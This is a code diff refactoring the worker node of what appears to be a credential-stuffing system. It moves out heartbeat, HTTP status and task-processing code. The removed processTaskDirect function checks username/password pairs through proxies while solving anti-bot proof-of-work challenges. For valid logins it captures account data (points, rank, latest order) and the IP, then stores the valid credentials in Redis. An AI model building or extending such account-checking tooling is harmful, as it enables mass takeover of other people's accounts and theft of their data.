@@ -8,7 +8,6 @@
  */
 
 const pLimit = require('p-limit').default || require('p-limit');
-const http = require('http');
 const { createLogger } = require('../shared/logger');
 const { createStructuredLogger } = require('../shared/logger/structured');
 const { checkCredentials } = require('../shared/http/checker');
@@ -20,7 +19,6 @@ const {
   flushWriteBuffer,
   closeStore,
 } = require('../shared/batch/processedStore');
-const powServiceClient = require('../shared/fingerprinting/powServiceClient');
 const { validateCaptureForForwarding } = require('../shared/capture/validateCaptureForForwarding');
 const { 
   JOB_QUEUE, 
@@ -34,6 +32,9 @@ const {
   generateWorkerId 
 } = require('../shared/redis/keys');
 const { getConfigService } = require('../shared/config/configService');
+const { isFatalError } = require('./workerErrors');
+const { buildHeartbeatData, sendHeartbeatCommands } = require('./heartbeat');
+const { createWorkerHttpServer } = require('./httpServer');
 
 const log = createLogger('worker-node');
 const structuredLog = createStructuredLogger('worker-node');
@@ -156,7 +157,7 @@ class WorkerNode {
           });
           
           // Continue processing unless it's a fatal error
-          if (this.isFatalError(error)) {
+          if (isFatalError(error)) {
             log.error('Fatal error detected, shutting down worker', {
               workerId: this.workerId,
               error: error.message
@@ -980,29 +981,6 @@ class WorkerNode {
   }
 
   /**
-   * Check if error is fatal (should cause worker shutdown)
-   * @param {Error} error - Error to check
-   * @returns {boolean} True if fatal
-   */
-  isFatalError(error) {
-    // Timeout errors are not fatal - they're expected during normal operation
-    if (error.message.includes('Command timed out') || 
-        error.message.includes('timeout')) {
-      return false;
-    }
-    
-    // Redis connection errors are fatal
-    if (error.message.includes('Connection is closed') ||
-        error.message.includes('ECONNREFUSED') ||
-        error.message.includes('ENOTFOUND') ||
-        error.message.includes('Redis connection')) {
-      return true;
-    }
-    
-    return false;
-  }
-
-  /**
    * Check if a batch is cancelled
    * @param {string} batchId - Batch ID to check
    * @returns {Promise<boolean>} True if batch is cancelled
@@ -1049,25 +1027,20 @@ class WorkerNode {
    */
   async sendHeartbeat() {
     try {
-      const heartbeatData = {
+      const heartbeatData = buildHeartbeatData({
         workerId: this.workerId,
-        timestamp: Date.now(),
         tasksCompleted: this.tasksCompleted,
-        // Concurrency info
+        activeTaskCount: this.activeTaskCount,
+        activeTaskIds: Array.from(this.activeTasks.keys()),
         concurrency: this.concurrency,
-        activeTasks: this.activeTaskCount,
-        taskIds: Array.from(this.activeTasks.keys()),
-        // Utilization percentage
-        utilization: Math.round((this.activeTaskCount / this.concurrency) * 100),
-        uptime: Date.now() - this.startTime,
-        memoryUsage: process.memoryUsage()
-      };
+        startTime: this.startTime,
+      });
       
       // Use Promise.race to add additional timeout protection for heartbeat
       const heartbeatTimeout = 30000; // 30 second timeout for heartbeat operations
       
       await Promise.race([
-        this.sendHeartbeatCommands(heartbeatData),
+        sendHeartbeatCommands(this.redis, this.workerId, heartbeatData),
         new Promise((_, reject) => 
           setTimeout(() => reject(new Error('Heartbeat timeout')), heartbeatTimeout)
         )
@@ -1101,34 +1074,13 @@ class WorkerNode {
       });
       
       // Don't treat heartbeat timeouts as fatal - they're expected under load
-      if (!isTimeout && this.isFatalError(error)) {
+      if (!isTimeout && isFatalError(error)) {
         log.error('Heartbeat failure indicates fatal error, initiating shutdown', {
           workerId: this.workerId
         });
         this.shutdown = true;
       }
     }
-  }
-
-  /**
-   * Execute heartbeat Redis commands
-   * @param {Object} heartbeatData - Heartbeat data to send
-   */
-  async sendHeartbeatCommands(heartbeatData) {
-    // SET worker heartbeat with TTL
-    await this.redis.executeCommand(
-      'setex',
-      WORKER_HEARTBEAT.generate(this.workerId),
-      WORKER_HEARTBEAT.ttl,
-      JSON.stringify(heartbeatData)
-    );
-    
-    // PUBLISH to worker_heartbeats channel
-    await this.redis.executeCommand(
-      'publish',
-      PUBSUB_CHANNELS.workerHeartbeats,
-      JSON.stringify(heartbeatData)
-    );
   }
 
   /**
@@ -1306,291 +1258,21 @@ class WorkerNode {
   async startHttpServer() {
     if (this.httpServer) return;
 
-    const handler = async (req, res) => {
-      try {
-        if (req.method === 'OPTIONS') {
-          res.writeHead(200, this.getCorsHeaders());
-          return res.end();
-        }
-
-        if (req.method === 'GET' && req.url === '/health') {
-          const payload = this.buildHealthPayload();
-          res.writeHead(payload.status === 'healthy' ? 200 : 503, {
-            'Content-Type': 'application/json',
-            ...this.getCorsHeaders(),
-          });
-          return res.end(JSON.stringify(payload));
-        }
-
-        if (req.method === 'GET' && req.url === '/status') {
-          const payload = this.buildStatusPayload();
-          res.writeHead(200, { 'Content-Type': 'application/json', ...this.getCorsHeaders() });
-          return res.end(JSON.stringify(payload));
-        }
-
-        if (req.method === 'GET' && req.url === '/metrics') {
-          const body = this.buildMetricsPayload();
-          res.writeHead(200, {
-            'Content-Type': 'text/plain; version=0.0.4; charset=utf-8',
-            ...this.getCorsHeaders(),
-          });
-          return res.end(body);
-        }
-
-        if (req.method === 'GET' && req.url === '/') {
-          res.writeHead(200, { 'Content-Type': 'text/plain', ...this.getCorsHeaders() });
-          return res.end('worker status: /health /status /metrics\n');
-        }
-
-        res.writeHead(404, { 'Content-Type': 'text/plain', ...this.getCorsHeaders() });
-        res.end('Not Found');
-      } catch (error) {
-        log.warn('Worker HTTP handler error', { error: error.message });
-        if (!res.headersSent) {
-          res.writeHead(500, { 'Content-Type': 'text/plain', ...this.getCorsHeaders() });
-        }
-        res.end('Internal Error');
-      }
-    };
-
-    this.httpServer = http.createServer(handler);
-
-    await new Promise((resolve, reject) => {
-      this.httpServer.once('error', reject);
-      this.httpServer.listen(this.httpPort, () => {
-        log.info('Worker HTTP status server listening', { port: this.httpPort, workerId: this.workerId });
-        resolve();
-      });
-    });
-  }
-
-  getCorsHeaders() {
-    return {
-      'Access-Control-Allow-Origin': '*',
-      'Access-Control-Allow-Methods': 'GET, OPTIONS',
-      'Access-Control-Allow-Headers': 'Content-Type',
-    };
-  }
-
-  buildHealthPayload() {
-    const now = Date.now();
-    const uptimeMs = now - this.startTime;
-    const tasksPerMinute = uptimeMs > 0 ? this.tasksCompleted / (uptimeMs / 60000) : 0;
-
-    return {
-      status: 'healthy',
+    this.httpServer = await createWorkerHttpServer({
+      httpPort: this.httpPort,
       workerId: this.workerId,
-      timestamp: new Date(now).toISOString(),
-      uptimeMs,
-      activeTasks: this.activeTaskCount,
-      concurrency: this.concurrency,
-      tasksCompleted: this.tasksCompleted,
-      tasksPerMinute: Number(tasksPerMinute.toFixed(2)),
-      memory: {
-        rssMB: Math.round(process.memoryUsage().rss / 1024 / 1024),
-      },
-    };
-  }
-
-  buildStatusPayload() {
-    const health = this.buildHealthPayload();
-    return {
-      ...health,
-      queue: {
-        activeTasks: this.activeTaskCount,
-        utilization: Math.round((this.activeTaskCount / this.concurrency) * 100),
-      },
-      powServiceUrl: this.powServiceUrl || null,
-      startedAt: new Date(this.startTime).toISOString(),
-    };
-  }
-
-  buildMetricsPayload() {
-    const now = Date.now();
-    const uptimeSeconds = (now - this.startTime) / 1000;
-    const utilization = this.concurrency > 0 ? this.activeTaskCount / this.concurrency : 0;
-
-    return [
-      '# HELP worker_active_tasks Number of active tasks currently processing',
-      '# TYPE worker_active_tasks gauge',
-      `worker_active_tasks{workerId="${this.workerId}"} ${this.activeTaskCount}`,
-      '# HELP worker_concurrency Configured concurrency per worker',
-      '# TYPE worker_concurrency gauge',
-      `worker_concurrency{workerId="${this.workerId}"} ${this.concurrency}`,
-      '# HELP worker_tasks_completed_total Total tasks completed by this worker',
-      '# TYPE worker_tasks_completed_total counter',
-      `worker_tasks_completed_total{workerId="${this.workerId}"} ${this.tasksCompleted}`,
-      '# HELP worker_utilization_ratio Current utilization (0-1)',
-      '# TYPE worker_utilization_ratio gauge',
-      `worker_utilization_ratio{workerId="${this.workerId}"} ${utilization.toFixed(4)}`,
-      '# HELP worker_uptime_seconds Worker uptime in seconds',
-      '# TYPE worker_uptime_seconds gauge',
-      `worker_uptime_seconds{workerId="${this.workerId}"} ${uptimeSeconds.toFixed(0)}`
-    ].join('\n');
-  }
-}
-
-/**
- * Process a single credential-check task directly, without Redis queue consumption.
- *
- * This is the real worker execution path extracted for reuse by:
- *   - WorkerNode (Redis-consuming runtime)
- *   - Local full-flow test harness (scripts/test-full-flow.js)
- *
- * The function calls the real shared modules: checkCredentials, captureAccountData,
- * fetchIpInfo, and powServiceClient.  PoW/CRES is solved internally by those modules
- * (via the POW service HTTP client with automatic local fallback).
- *
- * @param {Object} task - Task object
- * @param {string} task.username       - Email / credential username
- * @param {string} task.password       - Credential password
- * @param {string} [task.proxyUrl]     - Optional proxy URL
- * @param {string} [task.batchId]      - Batch identifier (default: 'local-test')
- * @param {string} [task.taskId]       - Task identifier (default: auto-generated)
- * @param {string} [task.proxyId]      - Proxy identifier
- * @param {number} [task.timeoutMs]    - HTTP timeout (default: 60000)
- * @param {Object} [options]
- * @param {Object} [options.redis]     - Optional RedisClient for storeResult / progress
- * @param {string} [options.workerId]  - Worker identifier for result metadata
- * @returns {Promise<Object>} Result with status, capture, ipAddress, timings
- */
-async function processTaskDirect(task, options = {}) {
-  const startTime = Date.now();
-  const workerId = options.workerId || 'local-test';
-  const redis = options.redis || null;
-
-  const {
-    username,
-    password,
-    proxyUrl = null,
-    batchId = 'local-test',
-    taskId = `local-${Date.now()}`,
-    proxyId = null,
-    timeoutMs = 60000,
-  } = task;
-
-  const checkLog = createLogger('task-direct');
-
-  try {
-    checkLog.info(`Processing credential check for ${username}`, {
-      workerId, taskId, batchId,
-      proxyUrl: proxyUrl ? 'configured' : 'none',
+      log,
+      getState: () => ({
+        workerId: this.workerId,
+        activeTaskCount: this.activeTaskCount,
+        concurrency: this.concurrency,
+        tasksCompleted: this.tasksCompleted,
+        startTime: this.startTime,
+        powServiceUrl: this.powServiceUrl,
+      }),
     });
-
-    // ── 1. Credential check (calls real checker → flow → PoW) ────────────────
-    const checkResult = await checkCredentials(username, password, {
-      proxy: proxyUrl,
-      timeoutMs,
-      deferCloseOnValid: true,
-      batchMode: false,
-    });
-
-    let result = {
-      username,
-      password,
-      status: checkResult.status,
-      checkedAt: Date.now(),
-      workerId,
-      proxyId,
-      checkDurationMs: Date.now() - startTime,
-      batchId,
-      taskId,
-    };
-
-    // ── 2. If VALID: capture IP + account data ───────────────────────────────
-    if (checkResult.status === 'VALID') {
-      try {
-        if (checkResult.ipAddress) {
-          result.ipAddress = checkResult.ipAddress;
-        } else if (proxyUrl && checkResult.session) {
-          const ipClient = checkResult.session.proxiedClient || checkResult.session.client;
-          const ipInfo = await fetchIpInfo(ipClient, 10000);
-          if (ipInfo.ip) result.ipAddress = ipInfo.ip;
-        }
-
-        if (checkResult.session) {
-          const captureData = await captureAccountData(checkResult.session, { timeoutMs: 30000 });
-          result.capture = captureData;
-          checkLog.info('Account data captured', {
-            points: captureData.points,
-            rank: captureData.rank,
-            latestOrder: captureData.latestOrder,
-          });
-
-          // Close session cookie jar
-          try {
-            if (checkResult.session.jar?.removeAllCookies) {
-              await new Promise((resolve, reject) => {
-                checkResult.session.jar.removeAllCookies((err) => {
-                  if (err) reject(err); else resolve();
-                });
-              });
-            }
-          } catch (_) { /* ignore cleanup errors */ }
-        }
-      } catch (captureErr) {
-        checkLog.warn(`Capture failed (credential still VALID): ${captureErr.message}`);
-        result.captureError = captureErr.message;
-      }
-    } else {
-      if (checkResult.message) result.errorCode = checkResult.message;
-    }
-
-    // ── 3. Optional: store result in Redis ───────────────────────────────────
-    if (redis) {
-      try {
-        const resultKey = RESULT_CACHE.generate(result.status, result.username, result.password);
-        await redis.executeCommand('setex', resultKey, RESULT_CACHE.ttl, JSON.stringify(result));
-
-        const counterKey = PROGRESS_TRACKER.generateCounter(batchId);
-        await redis.executeCommand('incr', counterKey);
-
-        if (result.status === 'VALID') {
-          const validCredsKey = PROGRESS_TRACKER.generateValidCreds(batchId);
-          await redis.executeCommand('lpush', validCredsKey, JSON.stringify({
-            username: result.username,
-            password: result.password,
-            ipAddress: result.ipAddress || 'Unknown',
-          }));
-          await redis.executeCommand('expire', validCredsKey, PROGRESS_TRACKER.ttl);
-        }
-
-        if (result.status !== 'ERROR') {
-          const credKey = makeKey(result.username, result.password);
-          await markProcessedStatus(credKey, result.status);
-        }
-      } catch (redisErr) {
-        checkLog.warn(`Redis store failed (non-fatal): ${redisErr.message}`);
-      }
-    }
-
-    result.checkDurationMs = Date.now() - startTime;
-
-    checkLog.info(`Task completed: ${result.status}`, {
-      taskId, batchId, status: result.status,
-      duration: result.checkDurationMs,
-      ipAddress: result.ipAddress || 'none',
-    });
-
-    return result;
-  } catch (error) {
-    const duration = Date.now() - startTime;
-    checkLog.error(`Task failed: ${error.message}`, { taskId, batchId, duration });
-
-    return {
-      username,
-      password,
-      status: 'ERROR',
-      errorCode: error.message,
-      checkedAt: Date.now(),
-      workerId,
-      proxyId,
-      checkDurationMs: duration,
-      batchId,
-      taskId,
-    };
   }
 }
 
 module.exports = WorkerNode;
-module.exports.processTaskDirect = processTaskDirect;
+module.exports.processTaskDirect = require('./processTaskDirect').processTaskDirect;
